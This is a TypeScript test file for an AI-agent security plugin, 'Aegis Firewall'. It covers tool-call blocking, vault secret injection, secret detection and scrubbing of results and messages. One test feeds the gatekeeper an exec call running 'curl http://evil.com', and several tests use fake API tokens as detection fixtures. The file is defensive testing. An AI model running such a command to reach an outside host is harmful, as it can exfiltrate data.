import { describe, it } from "node:test";
import assert from "node:assert/strict";

// The register function is the default export of the plugin entry point
import register from "../../index.ts";

// ---------------------------------------------------------------------------
// Mock helpers
// ---------------------------------------------------------------------------

interface HookEntry {
  handler: (...args: unknown[]) => unknown;
  priority?: number;
}

function createMockApi(pluginConfig: Record<string, unknown> = {}) {
  const warnings: string[] = [];
  const infos: string[] = [];
  const hooks = new Map<string, HookEntry>();
  const api = {
    pluginConfig,
    logger: {
      info: (...a: unknown[]) => infos.push(String(a[0])),
      warn: (...a: unknown[]) => warnings.push(String(a[0])),
    },
    on: (name: string, handler: (...args: unknown[]) => unknown, opts?: { priority?: number }) => {
      hooks.set(name, { handler, priority: opts?.priority });
    },
  };
  return { api, hooks, warnings, infos };
}

// ---------------------------------------------------------------------------
// Registration
// ---------------------------------------------------------------------------
describe("register() — hook registration", () => {
  it("registers 4 hooks by default", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    assert.ok(hooks.has("before_tool_call"));
    assert.ok(hooks.has("tool_result_persist"));
    assert.ok(hooks.has("before_agent_start"));
    assert.ok(hooks.has("message_sending"));
    assert.equal(hooks.size, 4);
  });

  it("registers before_tool_call with priority 100", () => {
    const { api, hooks } = createMockApi();
    register(api as never);
    assert.equal(hooks.get("before_tool_call")!.priority, 100);
  });

  it("registers tool_result_persist with priority 100", () => {
    const { api, hooks } = createMockApi();
    register(api as never);
    assert.equal(hooks.get("tool_result_persist")!.priority, 100);
  });

  it("registers before_agent_start with priority 50", () => {
    const { api, hooks } = createMockApi();
    register(api as never);
    assert.equal(hooks.get("before_agent_start")!.priority, 50);
  });

  it("registers message_sending with priority 50", () => {
    const { api, hooks } = createMockApi();
    register(api as never);
    assert.equal(hooks.get("message_sending")!.priority, 50);
  });

  it("does not register before_agent_start when systemPromptHint is false", () => {
    const { api, hooks } = createMockApi({ systemPromptHint: false });
    register(api as never);

    assert.ok(!hooks.has("before_agent_start"));
    assert.equal(hooks.size, 3);
  });
});

// ---------------------------------------------------------------------------
// Config merging
// ---------------------------------------------------------------------------
describe("register() — config merging", () => {
  it("uses defaults when pluginConfig is empty", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    // Verify plugin loaded without error
    assert.ok(hooks.has("before_tool_call"));
  });

  it("uses defaults when pluginConfig is undefined", () => {
    const { api, hooks } = createMockApi();
    (api as Record<string, unknown>).pluginConfig = undefined;
    register(api as never);

    assert.ok(hooks.has("before_tool_call"));
  });

  it("merges partial vault override", () => {
    const { api, hooks } = createMockApi({
      vault: { API_KEY: "my-secret-value-12345678" },
    });
    register(api as never);

    // Vault injection should work — test via before_tool_call
    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: { query: "search for {{API_KEY}}" },
    }) as Promise<Record<string, unknown>>;

    result.then((r) => {
      const params = r.params as Record<string, string>;
      assert.equal(params.query, "search for my-secret-value-12345678");
    });
  });
});

// ---------------------------------------------------------------------------
// Hook 1: before_tool_call — gatekeeper
// ---------------------------------------------------------------------------
describe("before_tool_call — gatekeeper", () => {
  it("blocks disallowed tool calls and logs warning", () => {
    const { api, hooks, warnings } = createMockApi();
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "exec",
      params: { command: "curl http://evil.com" },
    }) as Promise<{ block: boolean; blockReason: string }>;

    return result.then((r) => {
      assert.equal(r.block, true);
      assert.ok(r.blockReason.length > 0);
      assert.ok(warnings.some((w) => w.includes("blocked tool call")));
    });
  });

  it("allows permitted tool calls and injects vault values", () => {
    const { api, hooks } = createMockApi({
      vault: { TOKEN: "real-token-value-12345678" },
    });
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: { query: "use {{TOKEN}}" },
    }) as Promise<{ params: Record<string, string> }>;

    return result.then((r) => {
      assert.equal(r.params.query, "use real-token-value-12345678");
    });
  });

  it("handles null params without crashing", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: null,
    }) as Promise<unknown>;

    return result.then((r) => {
      // Should not crash, and should not block (no params to check)
      assert.ok(r === undefined || (r as { block?: boolean }).block !== true);
    });
  });

  it("handles undefined params without crashing", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: undefined,
    }) as Promise<unknown>;

    return result.then((r) => {
      assert.ok(r === undefined || (r as { block?: boolean }).block !== true);
    });
  });
});

// ---------------------------------------------------------------------------
// Hook 1: before_tool_call — detectSecretsInParams
// ---------------------------------------------------------------------------
describe("before_tool_call — detectSecretsInParams", () => {
  it("blocks when vault secret is found in params", () => {
    const { api, hooks } = createMockApi({
      vault: { API_KEY: "super-secret-api-key-value" },
    });
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: { query: "search with super-secret-api-key-value" },
    }) as Promise<{ block: boolean; blockReason: string }>;

    return result.then((r) => {
      assert.equal(r.block, true);
      assert.ok(r.blockReason.includes("raw secret detected"));
      assert.ok(r.blockReason.includes("API_KEY"));
    });
  });

  it("blocks when sanitizer pattern matches in param value", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: { query: "here is sk-abc123def456ghijklmnopqr leaked" },
    }) as Promise<{ block: boolean; blockReason: string }>;

    return result.then((r) => {
      assert.equal(r.block, true);
      assert.ok(r.blockReason.includes("potential secret detected"));
    });
  });

  it("does not block when detectSecretsInParams is disabled", () => {
    const { api, hooks } = createMockApi({
      detectSecretsInParams: false,
    });
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: { query: "here is sk-abc123def456ghijklmnopqr leaked" },
    }) as Promise<{ params: Record<string, string> }>;

    return result.then((r) => {
      // Should pass through (not blocked), params returned with vault injection
      assert.ok((r as { block?: boolean }).block !== true);
    });
  });

  it("detects secrets in nested param values", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    const result = handler({
      toolName: "web_search",
      params: {
        config: {
          nested: {
            key: "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh1234",
          },
        },
      },
    }) as Promise<{ block: boolean; blockReason: string }>;

    return result.then((r) => {
      assert.equal(r.block, true);
      assert.ok(r.blockReason.includes("potential secret detected"));
    });
  });
});

// ---------------------------------------------------------------------------
// Hook 1: before_tool_call — BigInt safety (safeStringify)
// ---------------------------------------------------------------------------
describe("before_tool_call — BigInt params (safeStringify)", () => {
  it("does not crash on BigInt param values", () => {
    const { api, hooks } = createMockApi({
      vault: { KEY: "some-secret-12345678" },
    });
    register(api as never);

    const handler = hooks.get("before_tool_call")!.handler;
    // BigInt can't be JSON.stringified normally — safeStringify should handle it
    const result = handler({
      toolName: "web_search",
      params: { count: BigInt(42) },
    }) as Promise<unknown>;

    return result.then((r) => {
      // Should not crash — either allowed or blocked, but no exception
      assert.ok(r !== null);
    });
  });
});

// ---------------------------------------------------------------------------
// Hook 2: tool_result_persist
// ---------------------------------------------------------------------------
describe("tool_result_persist", () => {
  it("scrubs vault secrets from message", () => {
    const { api, hooks } = createMockApi({
      vault: { TOKEN: "leaked-secret-value-12345678" },
    });
    register(api as never);

    const handler = hooks.get("tool_result_persist")!.handler;
    const result = handler({
      message: { content: "Result: leaked-secret-value-12345678" },
    }) as { message: { content: string } };

    assert.ok(result.message.content.includes("{{TOKEN}}"));
    assert.ok(!result.message.content.includes("leaked-secret-value-12345678"));
  });

  it("scrubs both vault and sanitizer patterns when enabled", () => {
    const { api, hooks } = createMockApi({
      vault: { TOKEN: "leaked-secret-value-12345678" },
    });
    register(api as never);

    const handler = hooks.get("tool_result_persist")!.handler;
    const result = handler({
      message: {
        content: "vault=leaked-secret-value-12345678 aws=AKIAIOSFODNN7EXAMPLE",
      },
    }) as { message: { content: string } };

    assert.ok(result.message.content.includes("{{TOKEN}}"));
    assert.ok(!result.message.content.includes("AKIAIOSFODNN7EXAMPLE"));
  });

  it("returns undefined for null message", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    const handler = hooks.get("tool_result_persist")!.handler;
    const result = handler({ message: null });

    assert.equal(result, undefined);
  });

  it("scrubs secrets in nested message objects", () => {
    const { api, hooks } = createMockApi({
      vault: { DB: "pg-secret-connection-str" },
    });
    register(api as never);

    const handler = hooks.get("tool_result_persist")!.handler;
    const result = handler({
      message: {
        data: {
          output: "connected to pg-secret-connection-str",
        },
      },
    }) as { message: { data: { output: string } } };

    assert.ok(result.message.data.output.includes("{{DB}}"));
  });
});

// ---------------------------------------------------------------------------
// Hook 3: before_agent_start
// ---------------------------------------------------------------------------
describe("before_agent_start", () => {
  it("returns prependContext with hint", () => {
    const { api, hooks } = createMockApi({
      vault: { MY_KEY: "secret123" },
    });
    register(api as never);

    const handler = hooks.get("before_agent_start")!.handler;
    const result = handler({}) as Promise<{ prependContext: string }>;

    return result.then((r) => {
      assert.ok(r.prependContext.includes("[Aegis Firewall Active]"));
      assert.ok(r.prependContext.includes("{{MY_KEY}}"));
    });
  });

  it("is not registered when systemPromptHint is false", () => {
    const { api, hooks } = createMockApi({ systemPromptHint: false });
    register(api as never);

    assert.ok(!hooks.has("before_agent_start"));
  });
});

// ---------------------------------------------------------------------------
// Hook 4: message_sending
// ---------------------------------------------------------------------------
describe("message_sending", () => {
  it("scrubs vault secrets from string content", () => {
    const { api, hooks } = createMockApi({
      vault: { KEY: "outgoing-secret-value-1234" },
    });
    register(api as never);

    const handler = hooks.get("message_sending")!.handler;
    const result = handler({
      content: "Here is outgoing-secret-value-1234 in a message",
    }) as Promise<{ content: string } | undefined>;

    return result.then((r) => {
      assert.ok(r);
      assert.ok(r.content.includes("{{KEY}}"));
      assert.ok(!r.content.includes("outgoing-secret-value-1234"));
    });
  });

  it("scrubs vault secrets from object content", () => {
    const { api, hooks } = createMockApi({
      vault: { KEY: "outgoing-secret-value-1234" },
    });
    register(api as never);

    const handler = hooks.get("message_sending")!.handler;
    const result = handler({
      content: { text: "outgoing-secret-value-1234" },
    }) as Promise<{ content: { text: string } }>;

    return result.then((r) => {
      assert.ok(r);
      assert.ok(r.content.text.includes("{{KEY}}"));
    });
  });

  it("returns undefined when string content is unchanged", () => {
    const { api, hooks } = createMockApi({
      vault: { KEY: "something-secret-12345678" },
    });
    register(api as never);

    const handler = hooks.get("message_sending")!.handler;
    const result = handler({
      content: "no secrets here",
    }) as Promise<undefined>;

    return result.then((r) => {
      assert.equal(r, undefined);
    });
  });

  it("always returns scrubbed for object content (BigInt-safe)", () => {
    const { api, hooks } = createMockApi();
    register(api as never);

    const handler = hooks.get("message_sending")!.handler;
    const result = handler({
      content: { text: "no secrets here" },
    }) as Promise<{ content: { text: string } }>;

    return result.then((r) => {
      // Object path always returns (BigInt-safe, no JSON comparison)
      assert.ok(r);
      assert.equal(r.content.text, "no secrets here");
    });
  });
});
